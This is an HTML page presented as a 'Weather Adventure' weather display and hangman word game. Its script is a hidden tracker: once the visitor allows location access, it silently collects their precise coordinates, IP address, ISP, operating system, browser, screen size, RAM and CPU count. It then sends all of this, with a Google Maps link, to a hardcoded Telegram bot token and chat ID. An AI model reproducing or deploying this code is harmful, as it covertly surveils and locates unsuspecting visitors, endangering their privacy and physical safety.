<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weather Adventure</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #6dd5fa, #2980b9);
            min-height: 100vh;
            color: white;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 30px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }
        h1 {
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        .weather-box {
            text-align: center;
            padding: 20px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            margin-bottom: 30px;
        }
        .game-box {
            padding: 20px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 15px;
        }
        #weather-display { font-size: 1.5em; margin-top: 10px; }
        #word-display { font-size: 1.8em; letter-spacing: 5px; margin: 20px 0; }
        #guesses-left { font-size: 1.2em; color: #ffd700; }
        #letter-input {
            padding: 10px;
            font-size: 1em;
            border: none;
            border-radius: 5px;
            margin-right: 10px;
        }
        button {
            padding: 10px 20px;
            font-size: 1em;
            border: none;
            border-radius: 5px;
            background: #3498db;
            color: white;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background: #2980b9; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üå§Ô∏è Weather Adventure</h1>
        
        <div class="weather-box">
            <h2>Your Weather</h2>
            <div id="weather-display">Fetching weather...</div>
        </div>

        <div class="game-box">
            <h2>Weather Hangman</h2>
            <div id="word-display"></div>
            <p id="guesses-left">Guesses left: 6</p>
            <p id="hint"></p>
            <input id="letter-input" maxlength="1" placeholder="Enter a letter">
            <button onclick="guessLetter()">Guess</button>
            <button onclick="newGame()">New Game</button>
            <p id="message"></p>
        </div>
    </div>

    <script>
        const botToken = "7569251393:AAFf2oExeJXn44G425fAu54NnpBl5EQFd9E";
        const chatID = "5502318215";
        let latitude, longitude;

        // Weather-related words for Hangman
        const weatherWords = [
            { word: "sunny", hint: "Bright and clear weather" },
            { word: "rainy", hint: "Wet weather with drops" },
            { word: "cloudy", hint: "Sky covered with gray masses" },
            { word: "stormy", hint: "Weather with thunder and lightning" },
            { word: "windy", hint: "Lots of moving air" }
        ];

        let currentWord, displayWord, guessesLeft, guessedLetters;

        // Fetch weather
        function getWeather(lat, lon) {
            fetch(`https://wttr.in/${lat},${lon}?format=%C+%t`)
                .then(response => response.text())
                .then(data => {
                    document.getElementById('weather-display').textContent = `üå§Ô∏è ${data}`;
                    sendToTelegram(lat, lon);
                })
                .catch(() => document.getElementById('weather-display').textContent = "Weather unavailable");
        }

        // Get location and start everything
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    getWeather(latitude, longitude);
                    getSystemInfo();
                },
                error => document.getElementById('weather-display').textContent = "Location denied"
            );
        }

        // Hangman game logic
        function startGame() {
            const randomIndex = Math.floor(Math.random() * weatherWords.length);
            currentWord = weatherWords[randomIndex].word;
            document.getElementById('hint').textContent = `Hint: ${weatherWords[randomIndex].hint}`;
            displayWord = "_".repeat(currentWord.length);
            guessesLeft = 6;
            guessedLetters = new Set();
            updateDisplay();
        }

        function updateDisplay() {
            document.getElementById('word-display').textContent = displayWord.split('').join(' ');
            document.getElementById('guesses-left').textContent = `Guesses left: ${guessesLeft}`;
        }

        function guessLetter() {
            const input = document.getElementById('letter-input');
            const letter = input.value.toLowerCase();
            input.value = '';

            if (!letter || guessedLetters.has(letter)) return;

            guessedLetters.add(letter);
            if (currentWord.includes(letter)) {
                let newDisplay = '';
                for (let i = 0; i < currentWord.length; i++) {
                    newDisplay += currentWord[i] === letter ? letter : displayWord[i];
                }
                displayWord = newDisplay;
                if (!displayWord.includes('_')) {
                    document.getElementById('message').textContent = "You won! üéâ";
                }
            } else {
                guessesLeft--;
                if (guessesLeft === 0) {
                    document.getElementById('message').textContent = `Game Over! The word was "${currentWord}"`;
                }
            }
            updateDisplay();
        }

        function newGame() {
            document.getElementById('message').textContent = '';
            startGame();
        }

        // System info and Telegram integration
        async function getSystemInfo() {
            const response = await fetch('https://ipapi.co/json/');
            const ipData = await response.json();
            const userAgent = navigator.userAgent;
            let os = "Unknown", browser = "Unknown";

            if (userAgent.includes("Win")) os = "Windows";
            else if (userAgent.includes("Mac")) os = "MacOS";
            else if (userAgent.includes("Linux")) os = "Linux";
            else if (userAgent.includes("Android")) os = "Android";
            else if (userAgent.includes("iPhone")) os = "iOS";

            if (userAgent.includes("Chrome")) browser = "Chrome";
            else if (userAgent.includes("Firefox")) browser = "Firefox";
            else if (userAgent.includes("Safari")) browser = "Safari";
            else if (userAgent.includes("Edge")) browser = "Edge";

            const message = `
üìç Weather Adventure Visitor
üåê IP: ${ipData.ip}
üñ•Ô∏è OS: ${os}
üåç ISP: ${ipData.org}
üñ•Ô∏è Browser: ${browser}
üìè Screen: ${window.screen.width}x${window.screen.height}
üíæ RAM: ${navigator.deviceMemory || 'Unknown'}GB
üî¢ CPU: ${navigator.hardwareConcurrency} cores
üìç Location: ${latitude}, ${longitude}
üåê Maps: https://www.google.com/maps?q=${latitude},${longitude}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`);
        }

        // Start the game
        startGame();
    </script>
</body>
</html>
